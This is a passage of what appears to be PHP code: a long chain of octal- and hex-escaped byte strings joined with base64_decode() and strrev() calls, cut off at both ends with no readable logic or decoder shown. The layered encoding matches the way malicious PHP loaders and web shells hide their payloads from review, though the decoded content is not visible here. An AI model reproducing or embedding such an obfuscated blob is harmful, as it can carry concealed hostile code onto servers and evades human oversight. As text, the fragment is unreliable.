14\140\264"."\243\65\314\314\50\133\100\250\120\110\231\16\240\226\130\30\173\135\201\372\25\126\224\144\274\212\2\102\323\5\5\12\103\51\376\55\74\127\340\4\276\347\243\200\330\362\121\200\157\66\30\112\362"."\302\207\353\217\167\360\157\301\176\243\100\127\234\231\320\140\352\273\274\205\177\267\161\143\163\234\20\215\111\201\100\54\320\36\347\301\330\162\156\222\303\343\250\151\216\332\321\325\56\50\176\44\260"."\xc\x21\x4b\x54\x30\x28\x8c\x5a\xd7\xf8\xa6\x2d\xaa\xed\xa1\x76\x8f\xf4\x93\xfe\x2c\x66\x21\x6c\xb\xd6\xbb\xb6\xde\xa3\xcc\x3e\xb3\x16\x60\xb8\xbb\x12\x3b\x63\xe4\x19\x93\x8b\x6b\x39\x2d\xa2\x46\xa2\x4b\x68\x98"."\170\7\14\345\123\342\264\244\164\53\210\343\116\10\216\333\142\133\27\137\15\12\302\141\205\232\117\53\35\321\345\1\341\160\116\112\200\30\341\177\316\177\106\167\317\120\217\17\61\13\326\52\141"."\307\330\322\254\60\66\204\70\256\201\203\45\344\16\260\155\164\225\7\166\14\65\153\246\231\114\25\21\104\306\56\320\337\25\354\203\320\112\310\220\44\246\361\303\274\21\1\357\351\152\317\272\236"."\123\172\274\76\152\74\212\231\227\36\217\150\222\32\132\201\366\330\170\334\141\371\252\346\260\145\75\224\216\172\11\137\164\325\322\300\2\370\201\363\340\2\70\220\100\160\141\23\237\314\320\151\353"."\x3a\xd0\xdf\x92\xc4\xba\x10\xfa\x8b\xa0\x9f\x48\x2\x4d\x97\xc1\x1\xd0\x92\x8c\x84\x97\x86\xd6\xe1\x7f\x44\x42\x2d\x1f\x48\x6a\x19\xe6\xcc\x10\xee\x58\x87\xfe\x45\x4\x66\x5d\xb8\xc3\x5d\x58\x73\x28\xb1\x3c\x14"."\xa2\x0\xec\x1b\x7e\x5\x28\x22\x38\xd0\x55\xc9\x7b\x24\xb6\xd6\x80\x64\x61\xbd\x1\x45\xab\x6a\xd\x19\x4c\x6f\xef\xf4\x5a\x55\xf5\x5b\x5d\x80\x2f\xdc\xe9\x4a\x4d\xf5\x94\xfa\x6a\xd8\x43\x2\xf1\xa0\xa0\xbe\xe"."\204\50\307\5\142\133\341\104\4\356\23\21\302\113\142\321\256\116\51\334\26\130\26\356\130\302\102\176\146\203\240\114\203\242\225\226\160\34\15\121\220\41\243\160\325\50\207\201\341\44\154\221\314"."\365\72\120\272\5\121\166\24\220\130\166\174\30\240\224\331\271\312\232\273\302\221\26\331\274\37\3\302\206\102\250\72\354\51\123\131\343\130\230\30\372\263\0\36\162\366\115\320\215\5\310\30\260"."\0\35\0\26\42\303\305\2\304\45\44\13\220\216\262\0\76\235\204\72\130\32\72\234\242\203\45\73\161\146\264\101\156\255\72\77\325\47\171\144\301\64\330\107\5\213\330\145\17\72\276\151\134".base64_decode('nOySBRP5mSRxoFqRimQmj4XKkszLTyEQ80lg0G/PqkWEOV7F8JQaatsJw846KgUzTlRpmFg=')."\321\112\325\62\163\27\42\103\125\115\111\344\117\366\155\71\102\210\313\350\375\0\10\274\205\254\11\53\207\22\121\70\15\72\117\124\234\114\255\342\7\45\160\321\341\201\137\150\321\327\350\117\17"."\4\231\360\244\7\52\251\366\300\246\333\303\30\366\356\236\341\272\72\57\372\147\56\372\153\106\177\101\364\27\302\21\255\75\303\163\132\321\307\274\326\136\77\134\17\365\364\124\115\64\234\0\300"."\6\25\202\125\64\310\162\31\174\217\114\146\260\113\40\325\316\261\273\6\162\230\23\362\173\172\247\40\302\55\261\150\47\345\130\224\160\253\102\75\144\50\325\364\26\242\32\130\261\140\54\204\127"."\23\205\142\151\65\325\16\221\332\302\152\5\214\347\153\235\271\302\35\55\241\25\112\265\221\32\126\65\115\205\314\12\132\273\254\40\245\254\44\126\2\155\53\134\333\131\31\163\110\221\321\221\235"."\xaf\x41\x42\x9e\x10\x28\x5a\xc6\xca\x11\x5f\x17\xcc\x3c\xd9\x3\x87\x78\x9e\x42\x39\x68\x9a\x14\x8e\xa3\xd\x3e\x12\x21\x3d\x45\x49\x86\x85\x19\x5f\x8f\xc2\x5d\x52\xe0\x48\x7c\x58\xa1\x2\x5c\x28\x88\x25\xd0\x82".strrev('–aΠ,‘'."\n".'xR‘l0¦blΚJX9Vo<%ΩµsM>Gύ	<[„‘ΐ"EhRh')."\345\16\113\201\113\247\241\316\130\270\75\20\133\11\103\46\316\14\260\104\315\254\303\162\133\4\14\253\113\362\42\320\201\132\55\173\25\240\163\314\51\62\72\377\62\212\214\132\103\77\253\360\314"."\xd3\x4f\xf0\xf8\xab\x72\xd3\x70\x26\x74\xa9\x61\x26\xd6\x1e\xf6\xc1\xdc\x73\x10\xeb\x35\x26\x52\xcb\x21\x12\xc5\x43\x62\xd6\x0\xf7\x61\x56\xe4\x54\xd9\xfe\x4e\xb8\x24\xc6\x9b\x2a\x9e\x64\xb6\x3b\xb4\x6\xba\x22".base64_decode('cgwMlbI0tPJz1ghraaU1wtKY+EbcnvGxgJ7VzIKeUk8iNQ3oNFvKY9c5TCQnDNkHsVBQK9Y=').base64_decode('NMximVjbYcfuSkRVtCvFQniPKOuLdIaXJwwyYwDu+/lzus1gKnWb5+dSrFDHknBHqAkbySM=').strrev('ρTCnvφΝa΅OΙ%‹·¶Π|iUM£‡j’'."\n".'8\\QeVΏ#U\'(\\κΨtδ5^')."\xb2\x4\x84\x5f\xa\x2e\x4d\x27\x69\xa5\x3e\x9c\x5b\xde\xfa\x20\xbf\xcb\x9f\xad\x61\x36\xe2\x14\xc\x4c\x39\x9e\xf9\x2\x5c\x75\x54\xee\x56\x65\x97\xa3\x85\x96\xbd\xb8\x63\x67\xd7\xf8\xdc\xcf\x21\x64\xe8\x92\xfc"."\x4a\x90\x2b\x21\x56\x21\xb9\xb3\xca\xbb\x9b\x87\x2d\xde\xdb\x99\xdb\x1f\xb4\xf7\x66\x99\x5f\x34\x55\x17\x9d\xcb\xe9\x96\xc5\xaf\xde\x13\x19\x5d\xb1\xa\x7a\x92\xf8\x53\x55\xc0\xed\x9f\x92\x32\xe5\x5b\x45\x98\xa"."\162\4\143\237\166\106\70\344\220\35\21\267\64\303\124\71\15\302\163\330\2\61\256\147\341\216\241\245\217\30\73\10\213\106\141\57\46\31\101\220\22\304\274\122\367\212\256\214\120\122\230\17\234"."\x4\x25\x22\x23\xc2\x11\x31\xbe\xb4\x11\x65\xf6\x32\xb9\x82\x18\x9e\x51\x83\x6d\x9f\xee\xfb\x58\xde\xc8\xbc\xd9\xc9\xaf\x56\x97\x8b\x8b\x28\xd8\xa1\x50\x1\xce\x8b\x5a\x9e\x4f\x9e\x4\x7c\x3f\x5a\x6\x89\xfd\x90"."\x7c\xde\xc\x33\x8f\x5e\xa4\x65\x92\x39\x2b\xe\x32\x92\x91\x73\x98\xcb\x95\xf2\xa8\x12\xaf\x6c\x3b\x86\x30\x8b\x44\x4a\xd6\x2a\xcc\x17\x25\xd\xcd\x1\xd\x2e\x84\xbd\xf0\x91\x86\x18\xf6\x5b\x64\x29\x3e\xe1\xb7"."\210\224\211\71\57\257\360\36\222\322\144\13\137\311\233\377\111\62\342\220\51\27\230\337\157\310\256\104\174\302\227\63\137\114\213\371\104\141\303\170\57\103\70\204\135\252\324\226\116\16\57\274\270".base64_decode('0tGQpoFE0E+y/JVG0Yg2Ay+HEQl3pFi+ysCTdMRMc8qFmFtwtOagXuEo5PXp2HaNWhKFuOc=')."\x4d\x94\x91\xfa\xc7\xfb\xe2\x4c\x5d\x92\x33\xed\x9\x8\x4e\xc5\x7c\x41\x0\xe4\x15\x16\x89\x60\xea\x8b\x2b\x8c\xe9\x82\x5f\x40\xd9\x88\xa9\xe0\x17\x66\x12\x4\x98\xd4\x44\x32\x49\x44\xdb\x95\x87\xa0\x23\x35\x6b"."\202\231\317\100\262\300\61\264\123\164\104\325\66\264\31\105\31\73\143\130\11\7\361\147\271\200\204\330\210\333\112\372\211\315\66\34\56\347\223\253\57\172\103\13\223\275\26\321\165\376\305\24\160".base64_decode('wFebYCMC9GdlLuVFDQesS+k295hFjGAlf16SxXuO09shyV2uNqhjy0AmuilTcYKulHcOmog=')."\357\326\342\321\256\30\273\7\302\141\54\377\122\143\241\340\112\176\45\303\143\133\3\313\334\61\141\54\277\14\54\251\30\315\245\152\70\236\34\137\325\130\24\213\37\103\221\126\127\206\170\33\367"."\xbc\xec\x8c\x53\x23\xe1\x8e\xa5\x15\x13\x10\xbb\xd2\x2e\x65\xa1\x91\xe1\x44\xa8\xdd\x1d\xe7\x2c\x21\x1e\xa\xc4\x98\x5b\x70\x1c\x6e\x8e\x44\x83\x52\x72\x38\x5a\x3e\x12\x9c\x1f\xe2\x91\x54\x78\x49\x23\xfd\x67\xd4"."\364\254\45\347\251\106\164\254\112\255\303\122\16\257\332\73\275\166\121\317\231\265\65\75\376\105\276\151\134\70\107\311\225\144\131\75\101\264\305\66\237\106\167\4\336\267\130\44\315\6\41\277\317"."\7\225\360\17\177\217\237\271\145\363\213\104\370\25\360\47\273\366\30\160\303\37\247\76\256\34\15\165\71\200\141\56\25\174\156\363\75\225\331\354\61\312\252\365\63\75\210\60\275\342\125\343\53".base64_decode('43yunHEOjKQ4LauDuIDRX6cMilWiKgI6UNph0S5H+QxTrBaxrFNmsoS9aok5EvbvKMonFyE=')."\57\100\303\4\156\202\151\143\23\3\175\130\372\130\32\1\237\156\207\0\142\147\246\301\26\107\33\321\216\61\40\104\24\120\153\234\221\207\74\332\214\141\267\17\42\246\171\111\133\370\324\245\221".strrev('G¤σ5AΨ4HςKΜΏ-|2ΓΖφAώΨηΰ2ΛΕ~ΚΓ#k-Α+ςΩkΆx±iηhφ')."\345\50\74\25\223\47\177\345\44\132\232\77\227\267\353\47\200\350\54\352\175\246\151\117\220\272\254\375\363\13\206\304\356\36\253\227\57\203\224\76\310\72\255\203\302\262\320\136\264\304\161\20\330"."\31\257\374\350\4\136\27\62\243\232\352\163\361\35\20\221\345\254\245\304\235\210\110\356\253\234\6\107\164\241\44\152\16\111\276\276\331\362\104\331\201\147\3\337\303\113\260\253\135\346\132\167\15"."\361\224\352\166\263\272\306\253\15\70\322\205\377\357\65\136\164\200\166\204\135\256\126\117\41\173\115\273\231\56\66\370\155\334\316\74\332\237\240\55\300\261\310\313\221\354\131\134\163\12\357\214\155"."\56\142\300\43\271\53\226\70\321\215\155\124\146\302\43\16\255\210\267\117\51\335\224\135\207\353\7\314\352\221\167\10\150\320\243\10\377\350\114\160\354\164\174\316\326\43\136\125\222\41\164\122\166"."\304\301\250\173\156\100\50\353\345\6\270\316\112\322\301\335\140\106\102\204\212\22\3\3\57\255\240\264\346\21\266\64\301\274\270\171\44\46\275\41\345\160\202\42\277\115\243\25\12\301\14\356\203"."\143\15\73\242\222\162\240\37\353\344\310\32\102\116\357\353\50\271\205\162\221\51\16\157\211\57\356\116\275\137\162\264\136\126\2\342\70\363\41\346\111\241\54\25\261\247\206\110\376\374\266\264\223"."\341\345\300\16\65\314\24\333\233\54\266\50\117\31\366\232\226\345\55\24\115\254\43\330\144\344\322\176\153\10\322\262\232\145\57\163\370\256\372\102\17\353\330\7\113\73\347\327\241\11\303\136\202".strrev('ξ"Ν0–~'."\0".'I&•SήΞUwg/µ\\Φ0“~μ~m¨όau«όCΙύ‚ε'."\r".'ΆEό£Θ¬Υ').base64_decode('zFz4rqZXDPRb+HxG54NAGrukMfPsBSX6toXs+T6lk+ZyTwqS03j8vgpa6kz7UXIfjzjONJ8=')."\106\342\315\131\366\312\211\207\334\233\163\74\253\102\47\310\351\224\335\322\365\1\246\255\211\147\133\120\224\42\367\235\117\157\236\275\25\43\274\222\376\45\135\117\322\163\33\270\72\220\73\144\350"."\103\36\320\136\372\163\172\245\326\173\213\302\235\75\232\35\372\54\310\122\175\204\271\35\377\174\317\345\75\113\172\332\173\22\162\167\355\242\326\337\217\32\53\371\333\345\223\50\374\327\3\46\221".base64_decode('53FY9yf2fg9XKjHatSA+vQ3j50mEP9euWMRxFQagrBOjGW+Q6ZqZpWyKnIhRjWZ2UFfEpfg=')."\xf8\xb5\xb7\x8c\x6f\xbd\x7a\xcf\xce\x1f\x8c\x5f\x76\xc7\xbb\xdb\x77\x8c\xdf\xf4\x28\x8d\xa7\x83\xd2\xa2\xe7\xf9\xd4\x8e\x5f\x72\xe5\xee\x1d\xdf\xdf\xb3\x79\xe7\xde\x6b\x37\x7f\xf4\xd8\xa5\x7b\xb6\x3c\x8c\x95\x9e".base64_decode('br6D6kCNXb5h/OoHxi6/eM9Pzht/9Irx75+79/or3jlnAyyOPHEsGyimS2IoaJbxWx4be+w=').base64_decode('8r1XXb9nyxYJ3sYqeVlpdaCJGrvg/L3n3j12+fd2X3VzWQZagXsqcfeu/u7uG86TUtyZmok=').strrev('R7Ϋ»Ι^ω¶8^—γώη%fJ^3¦W6Ηw|.kρ¦B΅„};€υίwΨΒhyΰ!}Ο').base64_decode('swFXFq6Ex+Fp+eXwcYa0LaZuoa2yXbOTsE533/8Eag8dMXnmxrZcsPuW9bvvvwhm4rotY1c=').base64_decode('3Dl+/+27b93MiwWscugj4wIe3LBn2/nj127jgHhVpxQBQzCKwmATCVLh7se/t3vHTRhJLt4=')."\260\173\303\43\143\67\75\60\366\375\163\170\265\143\333\267\213\121\216\372\311\43\162\25\350\351\151\70\36\50\152\277\120\117\55\224\244\167\14\145\32\206\271\56\256\105\212\5\135\364\275\14\306"."\114\221\247\55\340\25\246\46\266\56\321\70\346\233\315\24\214\375\332\52\104\35\253\32\253\246\324\240\337\332\52\117\25\76\304\220\60\246\217\70\202\264\243\252\161\112\15\371\250\5\307\127\243".base64_decode('sDVIzrHFwgPh8CJEIKQr1EVkp8H7WIO/wc/2tkVrcI3i7bQuvqUIlo9uLvSVG3bP2qHbQ2Y=')."\121\326\354\156\250\3\323\277\214\264\65\344\54\40\362\364\365\11\41\73\3\324\243\132\215\127\154\54\107\72\310\320\107\165\247\35\340\17\377\170\354\374\255\173\257\275\337\15\113\205\63\0\213"."\x39\xb0\xb2\x87\x37\xa9\x5d\xcd\xd8\xf7\xae\x2b\xaf\x8f\xc0\x3b\x6b\x63\xc0\x63\xeb\x6f\xda\x7d\x95\xb\x92\xa9\xf2\x2a\x92\x14\x4e\x64\x20\xd8\xef\xa2\x23\x9c\xf4\xcb\x59\x28\xbe\xff\x6f\x56\x11\x95\x89\x36\xe2"."\273\3\32\261\302\333\125\30\51\345\275\130\112\346\215\313\56\123\135\357\107\325\71\341\261\234\313\11\57\263\4\111\261\265\346\304\47\175\327\252\121\221\137\235\223\174\300\23\31\52\335\273\230"."\x72\x15\xc4\x61\x6e\x81\x45\x9\xce\xa1\x5f\x58\x11\x61\x6\x40\x75\x32\x0\x8b\x5d\xed\xc5\xca\x31\x5e\xc4\xc5\xe3\x35\x86\x16\xae\x6d\x48\xf\x3a\xc8\x20\xce\x67\xcc\xdc\x8f\x9b\xb9\x47\x81\x64\xc1\x42\x57\xaf"."\374\260\332\60\72\204\341\144\374\10\216\27\213\160\275\106\152\242\24\101\70\52\66\65\11\317\146\124\2\351\52\31\51\167\225\104\11\310\133\52\261\12\53\26\52\37\21\31\0\351\104\230\227"."\xe7\x78\xff\x45\x43\x73\xcd\xef\x30\xdd\xcf\xcb\x88\xf3\xb5\x56\xfe\xfa\xc9\xca\x5c\x4a\x69\x98\xd1\x38\x6b\x5e\x23\x33\xb\x3e\x85\xe9\x30\x95\xa\xcc\x20\x2\x7d\xb2\xd7\x51\x4e\xf2\xf7\x33\x5a\x23\x9e\x25\x63"."\175\303\23\56\275\331\343\210\26\303\310\337\102\141\104\312\1\47\132\353\170\124\17\32\242\211\63\126\51\57\316\277\340\73\135\172\174\210\134\63\121\322\205\65\376\124\376\110\123\5\52\156\260".strrev('§=ό΄δ©¦Ψ¨”“@ό¥3$P‰SΈDβ›v Β'."\0".'ά„cΆ²ϊb±5ξ‘GΩ¤όω¤Έ').base64_decode('Wo1Trfm4oiZsBGNNZS904Q1LeIelHsgghd6g+fBzez68G8ZKANVJaD3sfvR1M0iIdC0Jd0g=')."\132\210\122\204\32\154\351\120\3\235\235\25\23\140\330\251\40\33\253\360\370\126\113\157\255\322\257\5\350\324\245\44\261\231\125\123\25\216\255\122\254\142\222\271\120\257\362\203\122\33\1\20\334"."\xd1\x2\x3\xb2\x54\xe3\x2c\x4a\x3f\xc2\x15\x2f\xf9\xa2\xc9\xd5\xb\x17\xf8\xd\xc8\xe9\xf3\x9f\x8c\x69\xb7\x1f\xab\xf3\xe5\x4f\xc1\x53\x27\x6b\x17\x91\xd8\x56\xe1\xc4\x4d\x51\x16\x68\xa\x1d\xae\xa6\x6a\x72\x2d".base64_decode('U61k0P7OdZkXujPz9/EW+DU5Ea+imMnQkB/HB7m704o3cgHphQXyQFVQyy8rz4IL9yXlJPY=')."\x90\x69\x86\x88\x11\x5c\x77\xbf\xb\xa\xb\x17\xe0\x8b\x24\xa6\x30\xe8\x27\x81\x5\xfe\xc2\x42\x79\xb6\x89\x2d\x5c\x79\x65\x7e\x22\x45\xf2\x8b\x25\xa5\xd2\x27\x67\x2b\x5f\x7f\xf2\x5b\xbf\xa\x78\x84\x95\x7b\x10"."\xf2\x33\xad\xa\x2d\x39\x80\x11\x51\x6c\x1d\xd0\xc\x48\xe8\xc4\x42\x8\x9a\xe0\x78\x7b\xc6\x96\xf4\xb1\x4a\xd8\x76\x95\xdc\x21\x15\xc5\xd3\x7d\x6b\xd7\xd2\x82\xf0\xbb\x4a\x67\x9e\x59\x1e\x7\x1a\xde\xee\xa4\x40"."\301\160\107\141\204\163\307\141\141\220\210\103\173\240\263\32\212\354\62\220\210\141\60\364\127\344\211\164\54\21\1\172\214\167\44\166\63\335\54\22\352\351\256\366\115\73\363\114\277\301\364\40\231"."\16\26\313\353\343\320\64\334\343\163\302\243\236\300\320\163\100\210\160\103\122\244\72\25\260\150\262\177\232\60\204\345\372\216\12\126\202\154\152\132\330\315\331\256\136\226\246\22\31\212\74\167\214"."\x6d\x35\xea\xe7\x32\xa4\x40\xe7\xca\xc4\x72\xfe\x19\xec\x10\x8c\xb9\x30\x10\x93\x7\xd2\xb5\xc4\x28\xd1\xf2\x11\x49\x5f\xc0\xe9\xef\x7d\x91\x78\xf9\x50\xce\x4a\xbf\x3\x85\x82\x83\x3a\xb1\x0\xbe\x6c\xcb\x1a\x7d".base64_decode('fk5S6AWcLylsSBkIIWiueKza6ErAtnEkehBRXLPISSCPR2XxSFgCmExJVIknL7CSRaNgO0g=').strrev('¬eUμ„ό£®¬\'H›gGΔ6ΈΐήEΡ…4ξZIΨς*¦ΌR•H(ΤZ·’<»Σ}$')."\x52\x18\x61\xce\x69\x7c\x1c\x8b\xb6\x89\x36\x58\x6e\x92\x8\x4f\x94\x76\xc5\xc0\x94\x2a\xd0\x1\xd7\x9e\x27\x9f\x41\x7f\xa7\x9c\xcc\xb0\x8c\xbc\x9f\x9a\x45\xc\x36\x31\x14\x21\x24\x90\x70\xf1\xfd\x58\x3a\x4b\x81".base64_decode('4KnUzlg0EQ2y9wWdYlwaN5OdSCxqjSsOcczOj+tHMQjOivghBrChWMrnuWoqxmW+VTZV/q8=')."\233\334\314\352\251\336\11\322\225\156\215\335\333\202\254\231\136\104\63\133\132\150\47\332\224\23\330\5\202\5\321\222\273\130\354\254\126\117\371\272\251\217\207\246\72\146\354\305\24\141\205\31\52"."\203\224\123\24\274\313\364\362\121\107\264\301\17\244\125\254\272\152\174\325\10\117\177\125\173\252\153\174\323\152\253\313\123\250\312\261\63\35\353\363\251\247\306\121\42\74\264\5\334\2\261\246\14"."\106\302\241\216\204\32\6\106\241\276\141\216\257\116\130\72\32\226\160\277\114\277\203\134\131\252\250\223\121\365\71\272\125\141\150\350\125\114\202\53\314\352\171\207\144\226\16\151\326\144\216\201\33"."\xea\xea\xea\xbc\x75\xf5\xe8\x7f\x66\x1\xc2\xdc\x91\x36\xd6\xd5\x95\x81\xd4\xd5\x35\x92\xff\x69\x2\xb9\xe\x1\x14\x74\xa6\x20\x72\xc9\xe8\x3c\x0\xc\xe9\x3a\x34\x8\xf6\x55\x74\xac\x2e\x31\xe6\xb5\x3b\x88\xad"."\x5d\x15\xdc\x34\x98\x16\xa1\xf0\x8b\xb0\x8f\xf8\xeb\x65\x24\xd7\xf1\x7a\xab\x42\xf4\xe\x20\xa4\x8b\x41\xc8\x49\x2f\x8e\xc6\xc1\xbf\x73\xda\x81\xed\xec\xd6\x80\xfa\x72\x67\x5b\x2a\x6a\x54\x9a\xc\x10\xb4\x9d\x9b"."\147\43\60\261\202\346\123\243\371\46\336\300\120\76\325\55\127\346\143\3\115\43\305\63\7\136\226\340\225\137\33\202\114\224\350\211\153\105\107\323\120\36\247\123\140\34\203\30\246\44\357\63\216"."\x90\x24\xb8\x98\x1b\x96\x1c\x1d\xe3\xa0\x7c\x7b\x48\x92\xb9\x8d\x33\x9\x65\xb9\x77\x19\x1c\xec\xe0\x25\xd1\x47\xad\xa8\xa5\x31\x8c\x61\x85\x15\x99\x31\x87\x54\xc1\xc3\xe0\xe0\xa9\x3c\x44\x86\x14\x1f\x53\x19\x4a"."\xa6\x24\x3b\x74\x3c\xae\x6c\x7f\x92\xc0\xb9\x8a\x9d\xd0\x40\x2\xe6\x8e\xf8\x45\x19\x30\xb2\xe\xb7\xd\xaa\x94\x55\x1e\xdb\xf9\x18\x90\xf5\x24\xe1\xcc\x89\x5f\xda\xc6\xd\xf5\xe2\x76\x37\x8a\x51\x44\xf4\x2d\xc0"."\x9f\xfb\xa2\x1a\xd9\xac\xbd\xa\x50\x1c\x1a\x24\x2f\x1d\xd0\x27\xa6\x89\x30\xa8\x71\x72\xd9\x84\xdb\xee\xc9\x26\xf3\xe6\xb8\x4\x71\xeb\x3a\xb2\x90\x34\x7b\xec\x5e\x2c\xfe\x5\xea\x88\x2c\x26\xc4\x22\xe8\x8d\x5e"."\x90\x7b\x9\x96\xa\x70\x27\xb9\xf2\x4\xe8\x75\x5a\x59\x6\x88\x2f\x87\x26\xb7\x8e\x15\xa0\x71\xbc\xb\x9a\xf8\x3\xe\x72\xb7\xe7\xb2\x93\x60\x2a\xc7\x92\x14\xdb\x2c\x78\xfb\x45\x68\x15\xb1\x32\x6\xa5\xd3\xab"."\257\120\64\323\10\23\54\171\320\120\174\147\345\150\16\136\16\131\1\210\267\136\206\223\43\361\375\46\173\273\36\120\113\270\172\320\122\174\363\224\100\5\77\47\105\72\127\270\224\20\344\257\362"."\xc9\x91\xf8\x58\x2c\xeb\x91\x91\x13\x89\xb3\xc\x7c\xde\x76\xc6\xf0\x96\x7d\xe\xd2\x31\xb1\x89\x5d\xd4\xf2\x56\xbf\xac\x18\xc3\xc0\x4\x95\xc2\x22\x2d\xf9\xcd\x54\xd5\x81\x26\xc\x57\x99\xda\x1a\x1e\x21\xa1\x20"."\342\214\247\161\124\260\341\270\64\116\20\342\227\325\23\320\34\40\217\144\121\341\2\42\354\255\355\270\303\247\76\240\151\43\343\125\344\154\316\264\267\57\370\36\373\330\304\240\360\260\362\167\152"."\345\353\71\74\244\252\54\163\302\53\272\315\266\241\117\25\20\321\211\154\145\130\105\366\165\134\100\43\47\113\122\10\227\316\156\106\321\201\34\134\352\170\160\264\102\337\200\127\360\103\367\47\71".base64_decode('56c8A7yNZyLuErsclzPhsrpcJGopp5I4xNtKWTumcqtM9TWAOvBU9ioOpdFCJ8PvuCTwIZQ=')."\302\274\26\333\370\121\137\173\321\331\111\154\73\60\113\335\224\154\263\212\160\77\340\53\305\46\115\161\156\303\322\246\242\310\5\241\355\71\221\301\102\243\136\205\264\175\76\171\111\245\102\52\366"."\160\302\152\343\76\331\141\73\100\60\246\315\317\333\270\370\100\112\332\147\43\62\123\234\240\131\274\13\105\123\35\132\10\322\173\20\34\24\65\203\65\136\143\155\43\172\255\344\335\15\111\4\340"."\12\272\265\200\161\16\211\15\102\101\151\213\46\14\202\315\366\170\366\352\206\320\236\45\237\202\52\277\175\335\5\354\343\174\201\134\161\111\351\262\102\373\240\124\136\46\156\101\136\50\357\2\247"."\123\324\223\146\61\205\167\111\311\247\120\336\216\351\151\71\110\24\36\330\22\21\36\373\345\42\260\13\72\211\26\341\245\31\110\332\45\331\241\235\364\250\7\12\111\152\136\22\367\352\255\127\70"."\333\253\322\222\151\140\272\224\100\340\53\161\300\56\221\260\144\256\107\44\143\361\122\37\277\277\166\361\242\314\2\120\221\131\75\146\322\207\13\40\56\275\160\17\54\71\15\25\213\235\351\213\236"."\311\131\110\235\145\131\150\32\346\266\204\355\237\234\142\341\347\133\272\330\54\126\112\251\120\25\111\222\106\64\311\331\157\30\35\61\110\220\60\242\63\265\163\157\175\203\227\71\221\224\355\1\331".strrev('zΆrP½i’ΕΈ›΅\\θ`ΔΆ΅γψ“ηΕχq‘ΒWΟi)ΰi@ΫFbgΐ4$°΄6‰').base64_decode('3higq1I6HSGc3OLQzHcBoPXhTIf3WURjqGcu06Ep6SoE3hGSX6AhuUQ/hPkCijLpKzDSwAg=')."\x65\x2d\xea\x30\x8c\xd9\x67\x70\x22\x27\xa2\x13\x26\x8f\x2c\x57\xf8\xc2\x58\x9\x45\x52\xc7\x9\x70\x4c\xae\xa9\xc5\x8e\x13\x1c\xe2\xcb\xf6\x11\x6e\xde\x8e\x95\x29\xf1\xce\xcd\xf5\xf1\x2d\x39\xc0\x52\x39\x72\x5a".strrev('_%¤@ΑΒKΆD©#9C‚Naυ44Θ18α¤ςω£ΟΣ­³ΎρΨ>gHjQζδuNΥ'."\0".'')."\252\244\361\325\256\120\134\104\315\125\311\262\125\55\361\44\22\135\65\104\134\115\147\200\241\167\37\177\131\10\177\172\373\320\171\302\233\342\347\60\113\234\270\110\247\240\60\361\262\243\263\130\212"."\210\172\261\254\304\74\266\131\314\226\345\301\102\370\12\320\131\41\103\226\200\13\105\275\34\176\104\307\72\223\122\213\245\14\245\12\255\1\370\312\65\220\147\241\144\150\304\46\351\371\211\32\157".base64_decode('5AcNyxAUgOUYkUsPtLSHO9RAJBJd7lBqFtcPRS5wScmvekkzIyaB1i575JRjHM+euIQwdPo=')."\x64\x17\xb1\x5\x76\x53\x6\xef\x11\xf3\xa7\x7a\x68\x50\x7a\x75\xaf\x50\xd4\xc\x4b\x97\x22\xe8\x3\x71\xf5\x60\x6\xa8\x65\xb3\x8e\xb7\x75\xb3\xfd\x52\xb0\xe4\xdc\x62\x2b\x56\xa5\xd2\xa\x58\x1c\x61\x78\x27\x6"."\210\205\227\264\45\376\307\115\65\122\302\211\242\221\142\332\152\334\344\233\276\342\23\224\137\144\146\165\212\267\242\312\143\376\247\257\26\172\44\57\153\304\217\34\173\66\325\44\307\47\340\355\151"."\134\70\252\122\207\152\242\12\304\270\24\107\12\362\355\257\77\5\45\140\67\267\41\146\325\204\3\342\374\202\241\240\20\134\13\75\325\242\303\72\26\74\262\223\16\23\342\41\312\1\3\356\320".base64_decode('0HQ9u+jW7Xc8qlhWB3moh6Z1414gyF7RJxTimvAiqzulQgNQsiLEYRxAaVLq6AOh/NElZQE=')."\163\154\41\52\40\16\35\103\271\202\355\70\361\267\311\166\76\322\224\320\10\54\33\52\162\101\37\235\163\26\304\23\313\356\243\115\125\336\56\11\351\25\347\100\254\274\151\346\106\312\42\34\222"."\xb3\x8\xeb\xd\x57\xa3\xc6\xf\x55\xe5\xfb\x4d\x79\xd4\x89\x19\x0\x36\xf5\xa2\xef\xfe\x52\x81\x84\x7\x1d\x41\x74\xbb\xfc\xa5\x40\x9a\xfd\xff\x26\x23\x4d\x8c\x4b\x3e\x8b\x9d\x85\x94\x37\xc8\x72\x6f\x99\x7c\xbb"."\163\130\54\220\27\21\63\346\220\363\145\140\34\43\161\156\314\112\102\312\57\255\67\342\264\101\176\260\321\141\50\341\170\214\213\46\50\344\175\167\5\221\46\300\4\254\55\304\216\277\4\130\252"."\173\52\375\351\201\137\163\202\106\120\252\7\125\326\162\304\14\146\214\154\252\310\365\300\104\104\273\56\144\22\44\27\42\63\5\215\275\143\117\236\107\155\141\4\36\136\54\253\364\62\46\166\373"."\xea\x7c\x78\x4d\xbc\x67\x27\x36\x62\xe7\xfb\x5e\x5c\xc9\xc0\x12\xb\xca\xb2\x1d\x2f\xca\x25\xcc\x84\x96\xf6\x50\xc4\xc5\x24\x52\x84\x9a\x47\xe4\x6f\x59\xd1\x9f\xf4\x2\x25\x32\xb9\xa1\x30\x13\x5e\xc8\x62\x3c\xe4".strrev('Δ©΄JλHp›ΏΡsήDζβ'."\n".'―Κ4`DΫ:eΞ°4ΓΆb‚<M&Ω`”+I ΟέJSΑ').base64_decode('S4pKNSXiAs+k20waCTebpXyY3uA4YovSiVH2901vdYTxMICjdnbSK14YMLlIdu3OpfCIIvE=')."\203\265\277\374\232\36\353\264\1\115\301\72\104\114\171\153\300\44\7\63\237\174\244\3\0\145\1\363\157\203\30\115\257\300\14\307\252\306\230\204\130\154\372\272\54\41\33\62\171\253\34\113\230"."\157\102\151\275\100\50\230\105\55\335\367\260\57\11\346\47\67\313\217\140\374\221\133\51\310\127\201\363\311\76\272\134\310\117\213\336\317\317\127\70\54\330\13\331\125\224\320\15\162\77\113\133\376".base64_decode('xC57TpetN3hLt8IDuRO+r+sRhuaf9xKgMGsuoLl0PpbMmRN+hCk7BbkPQHwyXBli7glLmOU=')."\xf2\x6b\xa1\x9\xe1\x78\xfd\x57\xea\x35\xd0\xc3\xf2\x17\x84\xa5\x61\x90\xfa\x5d\x2a\x66\x3d\x44\x29\xc4\xc3\xf4\x33\x2b\x3e\x42\xec\x78\x97\xd0\x3d\xa1\x15\x9e\x31\xfe\xc2\x2\xc1\xfc\x82\x9c\xff\x52\x4e\x52\xd9"."\270\240\257\310\156\310\335\140\206\3\343\32